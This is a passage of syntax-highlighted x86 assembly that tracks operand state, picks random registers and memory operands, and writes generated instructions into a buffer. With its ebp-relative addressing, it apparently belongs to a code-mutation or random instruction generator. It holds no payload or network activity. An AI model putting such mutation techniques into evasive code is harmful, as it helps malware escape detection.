        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FromOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CmpLoop</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">FromTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CmpLoop</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ToOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CmpLoop</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; Operand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ReadFromType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Type</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FoundEquals</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CmpLoop</span><span class="sc0">


</span><span class="sc5">UndefineDependentOperands</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IsOperandUndefined</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Return</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Registers</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Undefine</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Undefine</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


    </span><span class="sc5">Undefine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc5">UndefineLoop</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ToOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UndefineLoop</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadOperand</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ToType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">UndefineLoop</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ToOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">UndefineLoop</span><span class="sc0">



        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Undefined</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetInfo</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">UndefineLoop</span><span class="sc0">
                

</span><span class="sc1">; -----------------------------------------------</span><span class="sc0">
</span><span class="sc1">; -------------------------- High level functions</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------</span><span class="sc0">




</span><span class="sc5">RandomOperand</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc5">EndValueFrecuency</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; ebx = 0 or 1</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; eax = 3 or 2</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Random</span><span class="sc0">                          </span><span class="sc1">; eax = 1 or 2</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GetReadableReg</span><span class="sc0">

        
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EndValueFrecuency</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GetReadable</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">EndValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">EndTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetWriteableReg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetWriteableLabel1</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetWriteableReg</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Returns a writeable operand</span><span class="sc0">
</span><span class="sc5">GetWriteable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">; create more reg then </span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                          </span><span class="sc1">; mem</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetWriteableReg</span><span class="sc0">

    </span><span class="sc5">GetWriteableLabel1</span><span class="sc4">:</span><span class="sc0">        

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetReadable</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Writeable</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestInfo</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetWriteableLabel1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetReadableReg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetReadable</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetReadableReg</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; Returns a operand</span><span class="sc0">
</span><span class="sc5">GetReadable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Registers</span><span class="sc4">+</span><span class="sc5">MemorySize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Registers</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">Return</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Registers</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">





</span><span class="sc1">; input</span><span class="sc0">
</span><span class="sc1">; eax = register or number</span><span class="sc0">
</span><span class="sc1">; ebx = number or register and value or mem</span><span class="sc0">
</span><span class="sc1">; ebx = 0 = number</span><span class="sc0">
</span><span class="sc1">; ebx = 1 = register</span><span class="sc0">
</span><span class="sc1">; ebx = 2 = [number]</span><span class="sc0">
</span><span class="sc1">; ebx = 3 = [register]</span><span class="sc0">



</span><span class="sc1">; ------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ---------------------- Low level functions</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------</span><span class="sc0">

</span><span class="sc5">Random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">RandomNumber</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">RandomNumber</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoMod</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc5">NoMod</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; input</span><span class="sc0">
</span><span class="sc1">; edx = opcode</span><span class="sc0">

</span><span class="sc5">OutputOnlyOpcode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OutputOpcode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OutputOnlyOpcode</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OutputNotComma</span><span class="sc0">

</span><span class="sc5">Output</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">','</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">OutputNotComma</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">setbe</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Label10</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'['</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        
     </span><span class="sc5">Label10</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">setnz</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OutputNumber</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
   </span><span class="sc5">Label11</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Label12</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">']'</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc5">Label12</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">OutputNumber</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">setnz</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; variable</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Label11</span><span class="sc0">


</span><span class="sc5">GetTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                      </span><span class="sc1">; TableSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Tables</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">SetInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTable</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ReturnPopEax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">InfoPtr</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; Set attribute</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DeleteFromInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTable</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ReturnPopEax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">InfoPtr</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; Set attribute</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">InfoPtr</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; Clear it</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ChangeInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTable</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ReturnPopEax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">InfoPtr</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">IsOperandUndefined</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Undefined</span><span class="sc0">



        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestInfo</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">SetZeroFlag</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SetZeroFlag</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">TestInfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTable</span><span class="sc0">
        
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ReturnPopEax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">InfoPtr</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">setnz</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">lahf</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sahf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc1">; eax = The operand</span><span class="sc0">
</span><span class="sc1">; ebx </span><span class="sc0">
</span><span class="sc1">; Which table to read from</span><span class="sc0">

</span><span class="sc5">ReadOperand</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IsOperandUndefined</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OperandIsUndefined</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTable</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0"> 
        

     </span><span class="sc5">FindValueLoop</span><span class="sc4">:</span><span class="sc0">
